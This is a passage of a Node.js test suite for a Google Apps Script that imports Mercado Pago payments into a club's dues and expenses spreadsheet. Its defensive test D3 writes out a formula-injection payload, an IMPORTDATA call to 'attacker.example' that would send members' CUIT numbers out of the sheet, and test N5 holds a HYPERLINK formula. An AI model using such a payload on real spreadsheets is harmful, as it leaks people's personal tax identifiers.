'use strict';
const path = require('path');
const { createWorld } = require('./mocks');

const CODE = process.env.CODIGO || path.join(__dirname, '..', 'Codigo.gs');
const ME = 111111111;
const CLUB = 222222222;
const ID = { Juancho: 333000001, Flaco: 333000002, Tano: 333000003, Dieguito: 333000006 };
const VERBOSE = process.argv.includes('-v');

// ------------------------------------------------------------ helpers
const results = [];
let current = '';
function section(name) { current = name; console.log('\n=== ' + name); }
function check(label, cond, detail) {
  results.push({ scenario: current, label, ok: !!cond, detail });
  console.log((cond ? '  PASS ' : '  FAIL ') + label + (cond || !detail ? '' : '\n         -> ' + detail));
}
function info(s) { console.log('  info ' + s); }

/** ART local "YYYY-MM-DD HH:mm" -> MP-style ISO string in -04:00 */
function mpDate(local) {
  const ms = Date.parse(local.replace(' ', 'T') + ':00-03:00');
  return new Date(ms - 4 * 3600e3).toISOString().replace('Z', '-04:00');
}
const art = local => new Date(Date.parse(local.replace(' ', 'T') + ':00-03:00'));
const nowIso = local => local.replace(' ', 'T') + ':00-03:00';

function pay(o) {
  const created = mpDate(o.created);
  const p = {
    id: o.id,
    date_created: created,
    date_approved: o.status && o.status !== 'approved' ? null : (o.approved ? mpDate(o.approved) : created),
    date_last_updated: o.updated ? mpDate(o.updated) : created,
    status: o.status || 'approved',
    status_detail: o.status === 'rejected' ? 'cc_rejected_other_reason' : 'accredited',
    operation_type: o.op || 'money_transfer',
    payment_type_id: o.ptype || 'account_money',
    payment_method_id: o.pmethod || 'account_money',
    collector_id: o.collector == null ? ME : o.collector,
    payer: {
      id: o.payerId == null ? null : o.payerId,
      identification: o.cuit ? { type: 'CUIT', number: o.cuit } : { type: null, number: null },
      first_name: o.first || null, last_name: o.last || null, email: o.email || null,
    },
    transaction_amount: o.amount,
    net_received_amount: +(o.amount * 0.994).toFixed(2),
    description: o.desc || '',
    point_of_interaction: o.bankName ? { transaction_data: { bank_info: { payer: { long_name: o.bankName } } } } : {},
  };
  return p;
}

const CANCHA_OP = 182263652715;
function basePayments() {
  return [
    // the manual Cancha row in Gastos (paid before "Importar desde")
    pay({ id: CANCHA_OP, created: '2026-10-02 09:00', payerId: ME, collector: CLUB, amount: 120000 }),
  ];
}

function seed(world, o = {}) {
  const headerI = ['Nombre', 'Apodo', 'Categoría', 'Teléfono', 'Email', 'CUIT/CUIL', 'Alta', 'Activo', 'Notas', 'ID Mercado Pago'];
  world.addSheet('Integrantes', [
    headerI,
    ['Juan Pérez', 'Juancho', 'A', '', '', '20-30111222-3', '', 'Sí', '', ''],
    ['Martín Gómez', 'Flaco', 'A', '', '', 20301112224, '', 'Sí', '', ''],
    ['Lucas Tanoni', 'Tano', 'A', '', '', '23351234569', '', 'Sí', '', ''],
    ['Pedro Colombo', 'Colo', 'A', '', '', '', '', 'Sí', '', ''],
    ['Diego Ruiz', 'Dieguito', 'A', '', '', '20-28999111-5', '', 'Sí', '', ''],
  ], o.integrantesCols || 26);

  const headerP = ['Fecha', 'Integrante', 'Monto', 'Imputación', 'Medio', 'Nombre de origen', 'CUIT', 'CVU/CBU', 'N° de operación', 'Notas'];
  const apodos = ['Juancho', 'Flaco', 'Tano', 'Colo', 'Dieguito'];
  const pagosRows = [headerP];
  for (let i = 0; i < 13; i++) {
    const d = new Date(Date.UTC(2026, 8, 5 + i * 2, 3, 0, 0)); // midnight ART, 05/09 .. 29/09
    const opCell = o.pagosOpFmt ? { value: 180000000100 + i, fmt: o.pagosOpFmt } : 180000000100 + i;
    pagosRows.push([{ value: d, fmt: 'dd/mm/yyyy' }, apodos[i % 5], 15000, 'Cuota', 'Transferencia Mercado Pago',
      '', '', '', opCell, '']);
  }
  world.addSheet('Pagos', pagosRows);

  const headerG = ['Fecha', 'Tipo', 'Concepto', 'Monto', 'Sale de', 'Destinatario', 'N° de operación', 'Notas'];
  const gOp = o.gastosOp != null ? o.gastosOp : CANCHA_OP;
  world.addSheet('Gastos', [headerG,
    [{ value: art('2026-10-02 00:00'), fmt: 'dd/mm/yyyy' }, 'Cancha', 'Cancha octubre', 120000, 'Cuotas del mes',
      'Club Social y Deportivo Aberastain', o.gastosOpFmt ? { value: gOp, fmt: o.gastosOpFmt } : gOp, ''],
  ]);

  const cfg = [];
  for (let r = 1; r <= 36; r++) cfg.push(['', '']);
  cfg[0] = ['Parámetro', 'Valor'];
  cfg[3] = ['Cuota mensual ($)', 15000];
  cfg[4] = ['Inicio de la temporada', { value: art('2026-10-01 00:00'), fmt: 'mmm yyyy' }];
  cfg[15] = [{ value: art('2026-10-01 00:00'), fmt: 'mmm yyyy' }, 120000];
  cfg[16] = [{ value: art('2026-11-01 00:00'), fmt: 'mmm yyyy' }, 150000];
  cfg[32] = ['Importar pagos desde', { value: o.importarDesde || art('2026-10-10 00:00'), fmt: 'dd/mm/yyyy' }];
  cfg[33] = ['ID cuenta del club', ''];
  cfg[34] = ['Última sincronización', ''];
  cfg[35] = ['Resultado', ''];
  world.addSheet('Config', cfg);
}

function newWorld(payments, o = {}) {
  const w = createWorld({ codePath: CODE, me: ME, payments: payments, mp: o.mp || {}, ui: o.ui, orden: o.orden });
  seed(w, o);
  return w;
}

function snapshot(w) {
  const s = {};
  for (const [n, sh] of w.sheets) if (n !== 'Config' && n !== 'Resumen') s[n] = JSON.stringify(sh.rows(1)); // Config B35/B36 change every run
  return s;
}
function sync(w, when) {
  w.setNow(nowIso(when));
  try { w.run('sincronizar_'); return null; } catch (e) { return e; }
}
const rowsOf = (w, n) => (w.sheet(n) ? w.sheet(n).rows(2) : []);
const revisar = w => rowsOf(w, 'Por revisar');
const findOp = (rows, col, id) => rows.filter(r => r[col] === String(id));
const B = (w, a1) => w.sheet('Config').getRange(a1).getDisplayValue();
function dump(w, n) { if (!VERBOSE) return; console.log('  --- ' + n); rowsOf(w, n).forEach(r => console.log('    ' + JSON.stringify(r))); }

// ============================================================ Scenario 1..5 (one world, chronological)
section('S1 first sync (now 12/10/2026 15:00)');
const W = newWorld(basePayments().concat([
  pay({ id: 1001, created: '2026-10-10 10:00', payerId: ID.Juancho, cuit: '20301112223', amount: 15000 }),
  pay({ id: 1002, created: '2026-10-10 11:00', op: 'account_fund', ptype: 'bank_transfer', pmethod: 'cvu', payerId: ME, amount: 15000 }),
  pay({ id: 1003, created: '2026-10-11 09:00', payerId: 444000001, cuit: '27999888776', amount: 8000 }),
  pay({ id: 1004, created: '2026-10-11 12:00', payerId: ME, collector: CLUB, amount: 120000 }),
  pay({ id: 1005, created: '2026-10-11 13:00', payerId: ME, collector: 555000001, amount: 5000 }),
  pay({ id: 1006, created: '2026-10-11 14:00', status: 'rejected', payerId: ID.Flaco, cuit: '20301112224', amount: 15000 }),
]));
let err = sync(W, '2026-10-12 15:00');
check('sync does not throw', !err, err && err.stack);
const p1 = rowsOf(W, 'Pagos');
check('Pagos keeps the 13 manual rows + 1 new', p1.length === 14, 'Pagos rows=' + p1.length);
const r1001 = findOp(p1, 8, 1001)[0];
check('1001 (Juancho by CUIT) -> Pagos as Cuota', r1001 && r1001[1] === 'Juancho' && r1001[2] === '15000' && r1001[3] === 'Cuota',
  JSON.stringify(r1001));
check('1001 CUIT stored as text digits', r1001 && r1001[6] === '20301112223', JSON.stringify(r1001));
check('Juancho MP id learned in Integrantes!J2 as text',
  W.sheet('Integrantes').raw(2, 10).v === String(ID.Juancho), JSON.stringify(W.sheet('Integrantes').raw(2, 10)));
const rv1 = revisar(W);
check('Por revisar sheet created', !!W.sheet('Por revisar'));
check('1002 (bank account_fund, payer==me) -> Por revisar w/o payer id', findOp(rv1, 7, 1002).length === 1 && findOp(rv1, 7, 1002)[0][6] === '',
  JSON.stringify(rv1));
check('1003 (stranger) -> Por revisar "No coincide"', findOp(rv1, 7, 1003).length === 1 && /No coincide/.test(findOp(rv1, 7, 1003)[0][8]),
  JSON.stringify(rv1));
check('Por revisar has exactly 2 rows', rv1.length === 2, 'rows=' + rv1.length);
const g1 = rowsOf(W, 'Gastos');
check('1004 (admin->club) -> Gastos Cancha octubre', findOp(g1, 6, 1004).length === 1 && findOp(g1, 6, 1004)[0][2] === 'Cancha octubre',
  JSON.stringify(g1));
check('Gastos has exactly 2 rows (manual + 1004)', g1.length === 2, JSON.stringify(g1));
const all = JSON.stringify([p1, rv1, g1]);
check('1005 (admin->someone else) copied nowhere', all.indexOf('"1005"') === -1);
check('1006 (rejected) copied nowhere', all.indexOf('"1006"') === -1);
check('Config B34 = club id (auto-detected)', B(W, 'B34') === String(CLUB), B(W, 'B34'));
check('Config B35 = last sync set', B(W, 'B35') !== '', B(W, 'B35'));
info('B36 = ' + B(W, 'B36'));
info('fetches: ' + W.fetches.length + ' -> ' + W.fetches.map(u => u.replace('https://api.mercadopago.com', '').replace(/\?.*/, '')).join(', '));
dump(W, 'Pagos'); dump(W, 'Por revisar'); dump(W, 'Gastos');

section('S2 second sync with the same data (now 12/10/2026 15:30)');
let before = snapshot(W);
err = sync(W, '2026-10-12 15:30');
check('sync does not throw', !err, err && err.stack);
let after = snapshot(W);
for (const n of ['Pagos', 'Por revisar', 'Gastos', 'Integrantes']) {
  check(n + ' unchanged', before[n] === after[n], n);
}
info('B36 = ' + B(W, 'B36'));

section('S3 payment older than the search window is ignored (the first sync already searched from the season start)');
W.payments.push(pay({ id: 1007, created: '2026-10-08 10:00', payerId: ID.Juancho, cuit: '20301112223', amount: 17000 }));
err = sync(W, '2026-10-12 16:00');
check('sync does not throw', !err, err && err.stack);
check('1007 (08/10) not loaded (API honours range)', JSON.stringify(snapshot(W)).indexOf('1007') === -1);
W.mpOpts.ignoreRange = true; // even if the API returned it, the script must filter it
err = sync(W, '2026-10-12 16:30');
check('sync does not throw (API ignoring range)', !err, err && err.stack);
check('1007 not loaded even when API returns it', JSON.stringify(snapshot(W)).indexOf('1007') === -1);
W.mpOpts.ignoreRange = false;

section('S4 member pays twice same day same amount');
W.payments.push(pay({ id: 1008, created: '2026-10-13 10:00', payerId: ID.Tano, cuit: '23351234569', amount: 15000 }));
W.payments.push(pay({ id: 1009, created: '2026-10-13 10:30', payerId: ID.Tano, cuit: '23351234569', amount: 15000 }));
err = sync(W, '2026-10-13 12:00');
check('sync does not throw', !err, err && err.stack);
check('1008 -> Pagos (Tano)', findOp(rowsOf(W, 'Pagos'), 8, 1008).length === 1);
check('1009 -> Por revisar as "Posible duplicado"', findOp(revisar(W), 7, 1009).length === 1 && /Posible duplicado/.test(findOp(revisar(W), 7, 1009)[0][8]),
  JSON.stringify(revisar(W)));
check('1009 not in Pagos', findOp(rowsOf(W, 'Pagos'), 8, 1009).length === 0);
before = snapshot(W);
err = sync(W, '2026-10-13 12:30');
check('re-sync: nothing new', JSON.stringify(before) === JSON.stringify(snapshot(W)));

section('S5 learned payer.id used when CUIT is missing');
W.payments.push(pay({ id: 1010, created: '2026-10-14 10:00', payerId: ID.Juancho, amount: 15000 }));
err = sync(W, '2026-10-14 12:00');
check('sync does not throw', !err, err && err.stack);
check('1010 (no CUIT, learned id) -> Pagos Juancho', findOp(rowsOf(W, 'Pagos'), 8, 1010).length === 1 && findOp(rowsOf(W, 'Pagos'), 8, 1010)[0][1] === 'Juancho',
  JSON.stringify(revisar(W)));
before = snapshot(W);
err = sync(W, '2026-10-14 12:30');
check('final re-sync: nothing new', !err && JSON.stringify(before) === JSON.stringify(snapshot(W)));
info('final counts: Pagos=' + rowsOf(W, 'Pagos').length + ' Revisar=' + revisar(W).length + ' Gastos=' + rowsOf(W, 'Gastos').length + ' | B36=' + B(W, 'B36'));

section('S1b union dedupe: unfiltered search also returns payer==me payments');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 1004, created: '2026-10-11 12:00', payerId: ME, collector: CLUB, amount: 120000 }),
  ]), { mp: { unfilteredIncludesPayer: true } });
  err = sync(w, '2026-10-12 15:00');
  check('sync does not throw', !err, err && err.stack);
  check('club payment loaded exactly once', findOp(rowsOf(w, 'Gastos'), 6, 1004).length === 1, JSON.stringify(rowsOf(w, 'Gastos')));
}

section('S1c probarConexion runs');
{
  const alerts = [];
  const w = newWorld(basePayments().concat([
    pay({ id: 1001, created: '2026-10-10 10:00', payerId: ID.Juancho, cuit: '20301112223', amount: 15000 }),
  ]), { ui: { alert: t => alerts.push(t) } });
  w.setNow(nowIso('2026-10-12 15:00'));
  let e2 = null; try { w.run('probarConexion'); } catch (e) { e2 = e; }
  check('probarConexion does not throw', !e2, e2 && e2.stack);
  info('alert: ' + JSON.stringify(alerts[0]));
}

// ============================================================ Deviation probes
section('D1 same sync: CUIT-matched payment then same payer without CUIT');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 2101, created: '2026-10-10 10:00', payerId: ID.Flaco, cuit: '20301112224', amount: 15000 }),
    pay({ id: 2102, created: '2026-10-11 10:00', payerId: ID.Flaco, amount: 5000, desc: 'tercer tiempo' }),
  ]));
  err = sync(w, '2026-10-12 15:00');
  check('sync does not throw', !err, err && err.stack);
  check('2101 -> Pagos Flaco', findOp(rowsOf(w, 'Pagos'), 8, 2101).length === 1);
  check('2102 (same payer.id, learned in this same run) -> Pagos Flaco',
    findOp(rowsOf(w, 'Pagos'), 8, 2102).length === 1,
    '2102 went to Por revisar: ' + JSON.stringify(findOp(revisar(w), 7, 2102)));
}

section('D2 admin pays something else to the club account (QR at club canteen)');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 1004, created: '2026-10-11 12:00', payerId: ME, collector: CLUB, amount: 120000 }),
    pay({ id: 2201, created: '2026-10-11 22:00', op: 'regular_payment', ptype: 'account_money', payerId: ME, collector: CLUB, amount: 3500, desc: 'Buffet' }),
  ]));
  err = sync(w, '2026-10-12 15:00');
  check('sync does not throw', !err, err && err.stack);
  check('1004 (transfer to club) -> Gastos', findOp(rowsOf(w, 'Gastos'), 6, 1004).length === 1);
  check('2201 (personal QR purchase at club, operation_type regular_payment) NOT copied',
    findOp(rowsOf(w, 'Gastos'), 6, 2201).length === 0,
    'copied as: ' + JSON.stringify(findOp(rowsOf(w, 'Gastos'), 6, 2201)));
}

section('D3 attacker-controlled text written to non-text cells (formula injection)');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 2301, created: '2026-10-11 09:00', payerId: 444000009, cuit: '20111111112', amount: 1,
      desc: '=IMPORTDATA("https://attacker.example/?d="&TEXTJOIN(",",TRUE,Integrantes!F2:F40))' }),
  ]));
  err = sync(w, '2026-10-12 15:00');
  check('sync does not throw', !err, err && err.stack);
  check('description stored as plain text, not as a formula', w.formulas.length === 0, 'formulas created: ' + w.formulas.join(' | '));
}

section('D4 trigger running before the season starts (today 30/09, season from 01/10)');
{
  const w = newWorld(basePayments(), { mp: { invalidRange: 'error400' } });
  err = sync(w, '2026-09-30 20:00');
  check('no error when the season starts in the future (API rejects begin>end)', !err, err && (err.message + ' | B36=' + B(w, 'B36')));
  check('result says it is waiting', /En espera/.test(B(w, 'B36')), B(w, 'B36'));
  check('no search was sent', !w.fetches.some(u => /search/.test(u)));
}

section('D5 manual op number displayed with thousands separators (format #,##0)');
{
  // The club payment 182263652715 falls inside the import window and was also typed by hand in Gastos.
  const pays = [pay({ id: CANCHA_OP, created: '2026-10-10 09:00', payerId: ME, collector: CLUB, amount: 120000 })];
  const w = newWorld(pays, { gastosOpFmt: '#,##0' });
  info('Gastos!G2 displays as "' + w.sheet('Gastos').getRange('G2').getDisplayValue() + '"');
  err = sync(w, '2026-10-12 15:00');
  check('sync does not throw', !err, err && err.stack);
  check('already-typed club payment not duplicated', findOp(rowsOf(w, 'Gastos'), 6, CANCHA_OP).length === 0 && rowsOf(w, 'Gastos').length === 1,
    'Gastos now: ' + JSON.stringify(rowsOf(w, 'Gastos')));
}

section('D6 admin handles a Por revisar row (moves it to Pagos, deletes it from Por revisar)');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 2601, created: '2026-10-10 11:00', op: 'account_fund', ptype: 'bank_transfer', payerId: ME, amount: 15000 }),
  ]));
  err = sync(w, '2026-10-10 12:00');
  check('2601 -> Por revisar', findOp(revisar(w), 7, 2601).length === 1);
  // admin: adds the cuota to Pagos for Colo (as README says), and deletes the handled row from Por revisar
  const pg = w.sheet('Pagos'); const last = pg.getLastRow() + 1;
  pg.getRange(last, 1, 1, 10).setValues([[w.mkDate(art('2026-10-10 00:00').getTime()), 'Colo', 15000, 'Cuota', 'Transferencia bancaria', '', '', '', '', 'de Por revisar']]);
  const rv = w.sheet('Por revisar'); rv.getRange(2, 1, 1, 10).setValues([['', '', '', '', '', '', '', '', '', '']]);
  err = sync(w, '2026-10-10 12:30');
  check('handled transfer does not come back to Por revisar', findOp(revisar(w), 7, 2601).length === 0,
    'reappeared: ' + JSON.stringify(findOp(revisar(w), 7, 2601)));
}

section('D6b new member: admin copies CUIT from Por revisar, loads the cuota by hand, deletes the row');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 2650, created: '2026-10-10 23:00', payerId: 333000004, cuit: '20334445556', amount: 15000 }),
  ]));
  err = sync(w, '2026-10-10 23:30');
  check('2650 (Colo, CUIT not yet in Integrantes) -> Por revisar', findOp(revisar(w), 7, 2650).length === 1);
  // next morning, following README: add CUIT to Integrantes, load cuota in Pagos (dated the day it was processed), delete handled row
  w.sheet('Integrantes').getRange('F5').setValue('20-33444555-6');
  const pg = w.sheet('Pagos'); const last = pg.getLastRow() + 1;
  pg.getRange(last, 1, 1, 10).setValues([[w.mkDate(art('2026-10-11 00:00').getTime()), 'Colo', 15000, 'Cuota', 'Transferencia Mercado Pago', '', '20334445556', '', '', '']]);
  w.sheet('Por revisar').getRange(2, 1, 1, 10).setValues([['', '', '', '', '', '', '', '', '', '']]);
  err = sync(w, '2026-10-11 09:00');
  const colo = rowsOf(w, 'Pagos').filter(r => r[1] === 'Colo' && /10\/2026/.test(r[0]));
  check('Colo\'s single transfer counted once in Pagos', colo.length === 1, 'Pagos rows for Colo in Oct: ' + JSON.stringify(colo));
}

section('D11 Integrantes sheet with only 9 physical columns (no column J yet)');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 3001, created: '2026-10-10 10:00', payerId: ID.Juancho, cuit: '20301112223', amount: 15000 }),
  ]), { integrantesCols: 10 });
  err = sync(w, '2026-10-12 15:00');
  check('works with exactly 10 columns', !err, err && err.message);
  const w9 = createWorld({ codePath: CODE, me: ME, payments: basePayments(), mp: {} });
  seed(w9, {});
  // rebuild Integrantes with 9 columns
  const old = w9.sheet('Integrantes'); w9.sheets.delete('Integrantes');
  w9.addSheet('Integrantes', old.rows(1).map(r => r.slice(0, 9)), 9);
  err = sync(w9, '2026-10-12 15:00');
  info('with 9 columns: ' + (err ? 'THROWS: ' + err.message : 'ok') + ' | B36=' + B(w9, 'B36'));
}

section('D12 receipt number != API id, manual row same day/amount (dedupe fallback)');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 3201, created: '2026-10-10 10:00', payerId: ID.Dieguito, cuit: '20289991115', amount: 15000 }),
  ]));
  const pg = w.sheet('Pagos'); const last = pg.getLastRow() + 1;
  pg.getRange(last, 1, 1, 10).setValues([[w.mkDate(art('2026-10-10 00:00').getTime()), 'Dieguito', 15000, 'Cuota', 'Transferencia Mercado Pago', '', '', '', '55555555555', '']]);
  err = sync(w, '2026-10-12 15:00');
  check('not double-loaded (goes to Por revisar as posible duplicado)', findOp(rowsOf(w, 'Pagos'), 8, 3201).length === 0 && findOp(revisar(w), 7, 3201).length === 1,
    JSON.stringify(rowsOf(w, 'Pagos').slice(-2)));
}

section('D7 club auto-detection resolves to the admin\'s own account');
{
  // The last "Cancha" row in Gastos carries the op number of a payment where the admin is the COLLECTOR
  const pays = basePayments().concat([
    pay({ id: 2700, created: '2026-10-01 10:00', op: 'account_fund', ptype: 'bank_transfer', payerId: ME, amount: 120000 }),
    pay({ id: 2701, created: '2026-10-10 11:00', op: 'account_fund', ptype: 'bank_transfer', payerId: ME, amount: 15000 }),
  ]);
  const w = newWorld(pays, { gastosOp: 2700 });
  err = sync(w, '2026-10-12 15:00');
  check('sync does not throw', !err, err && err.stack);
  info('B34 detected as ' + B(w, 'B34') + ' (admin id is ' + ME + ')');
  check('club id is never the admin\'s own id', B(w, 'B34') !== String(ME), 'B34=' + B(w, 'B34'));
  check('incoming bank transfer 2701 not booked as a Cancha expense', findOp(rowsOf(w, 'Gastos'), 6, 2701).length === 0,
    JSON.stringify(rowsOf(w, 'Gastos')));
}

section('D8 more than 1000 matching payments in the window (e.g. after a long outage)');
{
  const pays = basePayments();
  pays.push(pay({ id: 2800, created: '2026-10-10 08:00', payerId: ID.Dieguito, cuit: '20289991115', amount: 15000 }));
  let t = Date.parse('2026-10-10T09:00:00-03:00');
  for (let i = 0; i < 1005; i++) {
    const d = new Date(t + i * 60e3);
    const loc = new Date(d.getTime() - 3 * 3600e3).toISOString().slice(0, 16).replace('T', ' ');
    pays.push(pay({ id: 900000 + i, created: loc, op: 'regular_payment', payerId: 700000000 + i, amount: 100 }));
  }
  const w = newWorld(pays);
  err = sync(w, '2026-10-12 15:00');
  check('sync does not throw', !err, err && err.stack);
  check('oldest member payment 2800 loaded', findOp(rowsOf(w, 'Pagos'), 8, 2800).length === 1,
    'lost; B35 advanced to ' + B(w, 'B35') + ', B36="' + B(w, 'B36') + '" (no warning)');
}

section('D9 transfer approved more than 2 days after it was created');
{
  const p = pay({ id: 2900, created: '2026-10-10 10:00', status: 'in_process', payerId: ID.Juancho, cuit: '20301112223', amount: 15000 });
  const w = newWorld(basePayments().concat([p]));
  for (const t of ['2026-10-10 12:00', '2026-10-11 12:00', '2026-10-12 12:00', '2026-10-13 09:00']) sync(w, t);
  p.status = 'approved'; p.date_approved = mpDate('2026-10-13 09:30'); p.date_last_updated = p.date_approved;
  sync(w, '2026-10-13 10:00');
  sync(w, '2026-10-13 10:30');
  check('late-approved transfer eventually imported', findOp(rowsOf(w, 'Pagos'), 8, 2900).length === 1,
    'never imported (search range is date_created >= last sync - 2 days)');
}

section('D10 date stored with time-of-day');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 3001, created: '2026-10-31 18:00', payerId: ID.Juancho, cuit: '20301112223', amount: 15000 }),
  ]));
  sync(w, '2026-11-01 10:00');
  const r = w.sheet('Pagos').getLastRow();
  info('Pagos!A' + r + ' display = "' + w.sheet('Pagos').display(r, 1) + '" (manual rows are midnight dates); a SUMIFS(A:A,"<="&DATE(2026,10,31)) excludes it');
}


section('N1 member pays an amount that is not a multiple of the cuota');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 4101, created: '2026-10-10 10:00', payerId: ID.Juancho, cuit: '20301112223', amount: 21000 }),
  ]));
  err = sync(w, '2026-10-10 12:00');
  check('sync does not throw', !err, err && err.stack);
  const r = findOp(rowsOf(w, 'Pagos'), 8, 4101);
  check('21000 -> Pagos with Imputación "Por clasificar"', r.length === 1 && r[0][3] === 'Por clasificar', JSON.stringify(r));
}

section('N2 large personal income and personal non-transfer movements are not copied');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 4201, created: '2026-10-10 10:00', payerId: 444000077, cuit: '20999000111', amount: 500000 }),
    pay({ id: 4202, created: '2026-10-10 11:00', op: 'account_fund', ptype: 'ticket', pmethod: 'rapipago', payerId: ME, amount: 15000 }),
    pay({ id: 4203, created: '2026-10-10 12:00', payerId: 444000078, cuit: '20999000222', amount: 500 }),
  ]));
  err = sync(w, '2026-10-10 15:00');
  check('sync does not throw', !err, err && err.stack);
  const all = rowsOf(w, 'Pagos').concat(revisar(w));
  check('500000 from stranger not copied', findOp(revisar(w), 7, 4201).length === 0 && findOp(rowsOf(w, 'Pagos'), 8, 4201).length === 0);
  check('own cash deposit (account_fund, not bank transfer) not copied', findOp(revisar(w), 7, 4202).length === 0);
  check('500 from stranger (below minimum) not copied', findOp(revisar(w), 7, 4203).length === 0);
}

section('N3 refund of a payment already loaded is reported once');
{
  const p = pay({ id: 4301, created: '2026-10-10 10:00', payerId: ID.Juancho, cuit: '20301112223', amount: 15000 });
  const w = newWorld(basePayments().concat([p]));
  sync(w, '2026-10-10 12:00');
  check('4301 -> Pagos', findOp(rowsOf(w, 'Pagos'), 8, 4301).length === 1);
  p.status = 'refunded'; p.transaction_amount_refunded = 15000; p.date_last_updated = mpDate('2026-10-11 09:00');
  err = sync(w, '2026-10-11 10:00');
  check('sync does not throw', !err, err && err.stack);
  const dev = findOp(revisar(w), 7, 'R4301');
  check('Por revisar gets one "Devolución" row', dev.length === 1 && dev[0][2] === 'Devolución', JSON.stringify(revisar(w)));
  sync(w, '2026-10-11 10:30');
  check('no second Devolución row', findOp(revisar(w), 7, 'R4301').length === 1);
}

section('N4 club payments: with late surcharge -> Gastos; odd amount -> Por revisar');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 4401, created: '2026-10-12 10:00', payerId: ME, collector: CLUB, amount: 126000 }),
    pay({ id: 4402, created: '2026-10-12 11:00', payerId: ME, collector: CLUB, amount: 50000 }),
  ]));
  err = sync(w, '2026-10-12 15:00');
  check('sync does not throw', !err, err && err.stack);
  const g = findOp(rowsOf(w, 'Gastos'), 6, 4401);
  check('126000 (5% surcharge) -> Gastos Cancha with surcharge note', g.length === 1 && g[0][1] === 'Cancha' && /recargo/.test(g[0][7]), JSON.stringify(rowsOf(w, 'Gastos')));
  const e = findOp(revisar(w), 7, 4402);
  check('50000 -> Por revisar as Egreso', e.length === 1 && e[0][2] === 'Egreso', JSON.stringify(revisar(w)));
  sync(w, '2026-10-12 15:30');
  check('re-sync: club rows not duplicated', findOp(rowsOf(w, 'Gastos'), 6, 4401).length === 1 && findOp(revisar(w), 7, 4402).length === 1);
}

section('N5 sender name that looks like a formula is stored as text');
{
  const w = newWorld(basePayments().concat([
    pay({ id: 4501, created: '2026-10-10 10:00', payerId: 444000079, cuit: '20999000333', amount: 15000, first: '=HYPERLINK("https://x.example";"Cobrar")' }),
  ]));
  err = sync(w, '2026-10-10 15:00');
  check('sync does not throw', !err, err && err.stack);
  check('no formulas created', w.formulas.length === 0, 'formulas: ' + w.formulas.join(' | '));
}

// ============================================================ etapa 1: cálculo, app y panel
function intentar(fn) { try { return { r: fn() }; } catch (e) { return { e }; } }
const PIN = '482915';
function uiPin(pin) {
  return {
    ButtonSet: { OK_CANCEL: 'OK_CANCEL' }, Button: { OK: 'OK' }, alerts: [],
    prompt() { return { getSelectedButton: () => 'OK', getResponseText: () => pin }; },
    alert(t) { this.alerts.push(t); },
  };
}
function mundoAdmin(payments) {
  const w = newWorld(payments || basePayments(), { ui: uiPin(PIN) });
  w.setNow(nowIso('2026-10-10 20:00'));
  w.run('definirPin');
  return w;
}

section('C1 cálculo: precios por mes, media cuota, bajas, parciales y caja');
{
  const w = newWorld([]);
  const D = s => w.mkDate(art(s + ' 00:00').getTime());
  const base = {
    inicio: D('2026-10-01'), saldoInicial: 1000, hoy: D('2026-10-20'),
    valores: [{ desde: D('2026-10-01'), cuota: 15000, cancha: 200000 }, { desde: D('2026-11-01'), cuota: null, cancha: 250000 }],
    miembros: [
      { apodo: 'Debe', cuits: [], ids: [] },
      { apodo: 'Adelanta', cuits: [], ids: [] },
      { apodo: 'Nuevo', cuits: [], ids: [], alta: D('2026-10-20') },
      { apodo: 'Baja', cuits: [], ids: [], ultimoMes: D('2026-10-01') },
      { apodo: 'Admin', cuits: [], ids: [], auto: true },
      { apodo: 'Parcial', cuits: [], ids: [] },
    ],
    pagos: [
      { fecha: D('2026-10-05'), apodo: 'Adelanta', monto: 45000, imputacion: 'Cuota' },
      { fecha: D('2026-10-21'), apodo: 'Nuevo', monto: 7500, imputacion: 'Cuota' },
      { fecha: D('2026-10-06'), apodo: 'Parcial', monto: 10000, imputacion: 'Cuota' },
      { fecha: D('2026-10-07'), apodo: 'Debe', monto: 8500, imputacion: 'No es de la caja' },
      { fecha: D('2026-10-07'), apodo: 'Debe', monto: 3000, imputacion: 'Por clasificar' },
      { fecha: D('2026-10-08'), apodo: 'Baja', monto: 2000, imputacion: 'Otro de la caja' },
    ],
    gastos: [{ fecha: D('2026-10-02'), tipo: 'Cancha', concepto: 'Cancha octubre', monto: 200000 }],
  };
  let x = intentar(() => w.ctx.calcularEstado_(base));
  check('calcula sin error', !x.e, x.e && x.e.stack);
  const e = x.r;
  const de = a => e.integrantes.find(i => i.apodo === a);
  check('sin pagos: debe octubre (1 cuota, $15.000)', de('Debe').estados[0].e === 'debe' && de('Debe').cuotasDebe === 1 && de('Debe').deuda === 15000);
  check('$45.000: oct, nov y dic pagados, $30.000 adelantado', ['pagado', 'pagado', 'pagado', 'sinvencer'].every((s, i) => de('Adelanta').estados[i].e === s) && de('Adelanta').adelantado === 30000);
  check('alta el 20/10: octubre media cuota, pagada con $7.500', de('Nuevo').estados[0].medio && de('Nuevo').estados[0].e === 'pagado' && de('Nuevo').deuda === 0, JSON.stringify(de('Nuevo').estados[0]));
  check('baja en octubre: noviembre "no juega", la deuda de octubre sigue', de('Baja').estados[1].e === 'nojuega' && de('Baja').deuda === 15000);
  check('administrador al día solo', de('Admin').estados[0].e === 'pagado' && de('Admin').estados[1].e === 'sinvencer');
  check('pago parcial: debe y faltan $5.000', de('Parcial').estados[0].e === 'debe' && de('Parcial').estados[0].falta === 5000);
  check('caja: suma cuotas, otros y administrador; no "No es de la caja" ni "Por clasificar"', e.caja.cobrado === 79500 && e.caja.saldo === 1000 + 79500 - 200000, JSON.stringify(e.caja));
  check('cancha: recaudado, quiénes pagaron y cuotas necesarias', e.cancha.recaudado === 47500 && e.cancha.pagaron === 3 && e.cancha.total === 6 && e.cancha.necesarios === 14, JSON.stringify(e.cancha));
  check('cuenta los pagos por clasificar', e.porClasificar === 1);
  const sube = Object.assign({}, base, { hoy: D('2026-12-05'),
    valores: base.valores.concat([{ desde: D('2026-12-01'), cuota: 18000, cancha: null }]) });
  const e2 = w.ctx.calcularEstado_(sube);
